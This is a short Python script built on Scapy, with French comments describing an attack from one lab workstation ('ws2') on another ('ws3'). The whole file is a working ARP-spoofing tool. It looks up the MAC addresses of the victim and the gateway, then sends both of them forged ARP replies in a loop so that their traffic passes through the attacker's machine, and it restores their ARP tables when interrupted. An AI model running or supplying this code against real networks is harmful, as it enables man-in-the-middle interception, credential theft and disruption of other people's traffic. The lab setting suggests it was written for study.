from scapy.all import ARP, send, sr, conf, get_if_hwaddr
import time

# Ce script est fait pour une attaque partant de ws2 envers ws3 ! Il est possible d'inverser attaqueur et victime en modifiant la variable victim_ip.

victim_ip = "10.1.0.3"     
gateway_ip = "10.1.0.1"    

# savoir d'ou l'attaque est lancée
interface = conf.iface
print(f"Using interface: {interface}")

# fctn pour récuperer l'adresse MAC
def get_mac(ip):
    ans, _ = sr(ARP(op=1, pdst=ip), timeout=2, verbose=False, iface=interface)
    for _, r in ans:
        return r.hwsrc
    return None

print("Resolving MAC addresses...")
victim_mac = get_mac(victim_ip)
gateway_mac = get_mac(gateway_ip)

if victim_mac is None or gateway_mac is None:
    print("failed to resolve one or more MAC addresses")
    exit(1)

print(f"Victim MAC: {victim_mac}")
print(f"Gateway MAC: {gateway_mac}")

try:
    print("Attack running: sending spoofed ARP replies (use Ctrl+C to stop)")
    while True:
        send(ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwdst=victim_mac), iface=interface, verbose=False)
        send(ARP(op=2, pdst=gateway_ip, psrc=victim_ip, hwdst=gateway_mac), iface=interface, verbose=False)
        time.sleep(2)
except KeyboardInterrupt:
    print("Restoring network...")
    send(ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwdst=victim_mac, hwsrc=gateway_mac), iface=interface, count=3, verbose=False)
    send(ARP(op=2, pdst=gateway_ip, psrc=victim_ip, hwdst=gateway_mac, hwsrc=victim_mac), iface=interface, count=3, verbose=False)
    print("Done")

